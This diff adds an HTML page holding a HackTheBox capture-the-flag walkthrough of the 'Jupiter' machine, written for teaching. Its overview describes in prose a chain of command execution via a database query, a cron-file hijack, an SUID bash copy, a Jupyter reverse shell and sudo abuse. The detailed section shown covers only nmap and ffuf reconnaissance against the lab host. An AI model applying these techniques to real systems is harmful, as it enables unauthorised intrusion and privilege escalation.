@@ -1,0 +1,999 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jupiter - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/medium/jupiter/img/jupiter.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Jupiter - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Jupiter">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Jupiter</span>
+<span class="n">Difficult</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Jupiter</h3><br/>
+Jupiter is a medium-difficulty machine on the HackTheBox platform. To start, we encounter a web service running Grafana in the background. Upon loading the main page, we notice POST requests being made to an endpoint that enables interaction with a database.<br/><br/>
+<h3><br>Shell as postgres</br></h3><br>
+Because we can control the content of the POST request, we exploit a 'malicious' query to execute system-level commands and gain access with a reverse shell.<br/><br/>
+<h3><br>Shell as juno</br></h3><br>
+When listing tasks running at regular intervals, we observe that the user 'juno' is executing a program with a file as an argument, a file which we, as Postgres, can modify. Modifying this file allows us to execute commands as 'juno'. After copying '/bin/bash' to the '/tmp' directory and assigning it SUID privileges, we abuse the '-p' parameter to inherit the privileges and execute commands with 'juno's EUID. Ultimately, by exploiting SSH keys, we gain full access as the 'juno' user.<br/><br/>
+<h3><br>Shell as jovian</br></h3><br>
+As a user 'Juno,' we belong to the 'science' group. While listing processes running under the 'Jovian' user, we notice the presence of 'jupyter-notebook.' By checking the open ports, we find port '8888.' This port is associated with an HTTP server running 'jupyter-notebook' in the background. After examining some logs, we manage to access the service and create our own notebook to execute Python code and gain access to the system via a reverse shell.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+The user 'Jovian' has sudoer privileges to run a program as root. This program opens a file that we can modify, allowing us to abuse our sudoer privileges to read and write system files as the 'root' user, ultimately gaining access to the 'root' user.<br/><br/>
+<h3><br>Recon</br></h3><br>
+First, we will run a port scan to discover open ports on the victim machine using the 'nmap' tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.216</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</pre></div>
+
+Once the initial scan is complete, we will proceed with a second scan to identify the technologies and services running on the ports we've previously discovered. <br/><br/>
+Again, we will utilize the 'nmap' tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.216</span> <span class="p">(</span><span class="mf">10.10.11.216</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">ac</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="mi">9</span><span class="n">b</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">60</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">db</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="n">ba</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="n">c6</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="mi">41</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">18.68</span> <span class="n">seconds</span>
+</pre></div>
+
+Thanks to this scan, we now have information about the services running on these ports.<br/><br/>
+<h3><br>Web Application</br></h3><br>
+Since we can't access 'jupiter.htb,' we need to add it to our <code>/etc/hosts</code> file to resolve the domain to the victim's IP address.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.216</span> <span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+When we access the website through our browser, we encounter the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/1.png"/><br/><br/>
+At this stage, there isn't much to do, so let's explore other avenues<br/><br/>
+<h3><br>Subdomain Enumeration</br></h3><br>
+Using tools like <a href="https://github.com/ffuf/ffuf">ffuf</a> or <a href="https://github.com/OJ/gobuster">gobuster</a>, we can conduct subdomain enumeration through a brute force attack. In my case, I will use <a href="https://github.com/ffuf/ffuf">ffuf</a> for this scan:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.jupiter.htb"</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+<span class="n">________________________________________________</span>
+
+<span class="n">webdisk</span>                 <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">149</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">localhost</span>               <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">149</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">mail</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">148</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">www</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">cpanel</span>                  <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">153</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">whm</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">153</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">smtp</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">ns1</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">pop</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">webmail</span>                 <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">ftp</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">154</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">autodiscover</span>            <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">148</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">test</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">148</span><span class="n">ms</span><span class="p">]</span>
+<span class="n">ns2</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">178</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">150</span><span class="n">ms</span><span class="p">]</span>
+<span class="p">[</span><span class="n">WARN</span><span class="p">]</span> <span class="n">Caught</span> <span class="n">keyboard</span> <span class="n">interrupt</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+</pre></div>
+
+All the responses are consistently returning '178' characters, so I'm going to filter out that result.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fs</span><span class="o">=</span><span class="mi">178</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.jupiter.htb"</span>
+
+        <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
+       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+
+       <span class="n">v2</span><span class="mf">.1.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">100</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="o">-</span><span class="mi">299</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">178</span>
+<span class="n">________________________________________________</span>
+
+<span class="n">kiosk</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">34390</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">2150</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">212</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">222</span><span class="n">ms</span><span class="p">]</span>
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">575</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+
+We've discovered the 'kiosk' subdomain. Now, let's add this subdomain to our <code>/etc/hosts</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.216</span> <span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span> <span class="n">kiosk</span><span class="o">.</span><span class="n">jupiter</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+Now, if we attempt to access 'kiosk.jupiter.htb,' we encounter the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/2.png"/><br/><br/>
+Grafana is running behind the scenes. For those who may not be familiar with Grafana, it's an open-source platform used for real-time data visualization and monitoring. It enables the creation of interactive dashboards and graphs using data from various sources, including databases, cloud services, monitoring systems, and more. Grafana is extensively utilized in the realms of system administration and application monitoring to visualize data and performance metrics in a user-friendly and customizable manner.<br/><br/>
+Although we ran a <a href="https://addons.mozilla.org/es/firefox/addon/wappalyzer/">Wappalyzer</a> scan, it did not provide information about the specific version of Grafana in use, thus yielding no useful information.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/3.png"/><br/><br/>
+When examining the requests made while accessing the site, one request stands out as particularly interesting:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/4.png"/><br/><br/>
